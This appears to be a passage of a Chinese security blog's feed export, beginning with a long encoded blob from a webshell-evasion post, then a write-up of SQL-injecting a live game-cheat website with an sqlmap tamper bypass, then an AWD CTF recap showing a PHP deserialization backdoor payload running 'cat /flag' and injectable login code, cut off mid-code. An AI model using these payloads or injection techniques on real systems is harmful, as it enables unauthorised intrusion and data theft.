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]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>webshell</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[向吃鸡外挂站开炮（二）]]></title>
    <url>%2Fposts%2Fhack-pubg-cheat-site-2%2F</url>
    <content type="text"><![CDATA[> > 上一篇 [向吃鸡外挂站开炮（一）](https://yzddmr6.tk/posts/hack-pubg-cheat-site-1/)前言首先打开网站我们可以看到他的炫酷界面暖心公告不要脸的宣传词发现注入基于tp3开发,后台/admin尝试万能密码提示密码错误尝试admin admin888 提示账号不存在两者回显不同，考虑可能存在注入无法利用？burp抓包发送到repeater进行进一步测试发现条件为真时返回status: -2，条件为假时返回status: -1进一步印证了猜想，后台存在注入扔到sqlmap跑无法检测出注入，提示一堆404 not found开始以为是cdn封锁了sqlmap的流量，后来发现根本没什么防护。。。虚假的cdn于是考虑可能是cms自身过滤了一些东西绕过过滤经过测试发现只要出现尖括号就会返回404可以用between来绕过这时就继续按照 条件真=&gt;-2 条件假=&gt;-1 来回显也就满足了盲注的条件忽然一想这个情景跟第五空间决赛的那道注入题一毛一样真返回一个页面 假返回另一个页面 出现被过滤字符返回其它页面 并且要用between来绕过CTF诚不欺我所以只要在sqlmap的参数里加上--tamper=between 即可最后数据库里管理员密码用的aes加密，没有秘钥，无法解密。普通用户登录口被关闭，无法注册也无法登录。除了脱出来一堆孤儿的信息其他也没什么用打包一下证据，全部提交有关部门。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[“北极星杯”AWD线上赛复盘]]></title>
    <url>%2Fposts%2Fxm-one-year-awd%2F</url>
    <content type="text"><![CDATA[前言10.3 星盟安全周年庆举办了一场线上AWD比赛参赛队伍总计31支，见到了不少熟悉的ID神仙大战果然被暴打hhhhhh，运气好还水了一个小奖品。学到了不少东西，今天来写一下复盘总结。比赛规则每个队伍分配到一个docker主机，给定web(web)/pwn(pwn)用户权限，通过特定的端口和密码进行连接；每台docker主机上运行一个web服务或者其他的服务，需要选手保证其可用性，并尝试审计代码，攻击其他队伍。选手需自行登录平台熟悉自助式初始化、api提交flag等功能。初始密码为队长所设密码，队长需在比赛开始前10分钟向主办方提交密码，过期未提交视为弃权。选手可以通过使用漏洞获取其他队伍的服务器的权限，读取他人服务器上的flag并提交到平台上。每次成功攻击可获得5分，被攻击者扣除5分；有效攻击五分钟一轮。选手需要保证己方服务的可用性，每次服务不可用，扣除10分；服务检测五分钟一轮；不允许使用任何形式的DOS攻击，第一次发现扣1000分，第二次发现取消比赛资格。比赛最终结果将在10月3日晚19:00-19:30于北极星杯网络安全交流群直播公布，同时会有技术分享及抽奖活动，敬请关注。比赛开始这次比赛3个web 2个pwn首先就是老套路，打包源码跟数据库，然后D盾扫一扫。因为队友的分工是权限维持，自己的分工主要是get flag，就直接看漏洞吧。WEB1预留后门三个冰蝎一个普通一句话难受的就是自己主要是撸批量getflag脚本的，但是冰蝎的shell怎么tm写脚本啊喵喵喵？？？第一时间写好了普通一句话的批量脚本改了改让他自动提交当时大家可能都还没修，手速快就自动交了两轮但是可以看到10队已经上了通防脚本，返回了一个假的flag反序列化sqlhelper.php最下面有这样一句123456789101112if (isset($_POST[&apos;un&apos;]) &amp;&amp; isset($_GET[&apos;x&apos;]))&#123;class A&#123; public $name; public $male; function __destruct()&#123; $a = $this-&gt;name; $a($this-&gt;male); &#125;&#125;unserialize($_POST[&apos;un&apos;]);&#125;$name 传个system $male传个cat /flag 就可以拿到flag了payload:GET: ?x=yzddmr6POST: un=O:1:&quot;A&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;system&quot;;s:4:&quot;male&quot;;s:9:&quot;cat /flag&quot;;};注入上传login.php123456789101112131415161718192021&lt;?phpif (isset($_POST[&apos;username&apos;]))&#123; include_once &quot;../sqlhelper.php&quot;; $username=$_POST[&apos;username&apos;]; $password = md5($_POST[&apos;password&apos;]); $sql = &quot;SELECT * FROM admin where name=&apos;$username&apos; and password=&apos;$password&apos;;&quot;; $help = new sqlhelper(); $res = $help-&gt;execute_dql($sql); echo $sql; if ($res-&gt;num_rows)&#123; session_start(); $row = $res-&gt;fetch_assoc(); $_SESSION[&apos;username&apos;] = $username; $_SESSION[&apos;id&apos;] = $row[&apos;id&apos;]; $_SESSION[&apos;icon&apos;] = $row[&apos;icon&apos;]; echo &quot;&lt;script&gt;alert(&apos;登录成功&apos;);window.location.href=&apos;/&apos;&lt;/script&gt;&quot;; &#125;else&#123; echo &quot;&lt;script&gt;alert(&apos;用户名密码错误&apos;)&lt;/script&gt;&quot;; &#125;&#125;?&gt;可以看到直接把接收到了$username给带入到了sql语句中，产生注入直接用万能密码就可以绕过接着往下看登录之后可以做什么info.php1234567891011121314151617181920212223if (isset($_FILES)) &#123; if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) &#123; echo &quot;错误：&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;; &#125; else &#123; $type = $_FILES[&quot;file&quot;][&quot;type&quot;]; 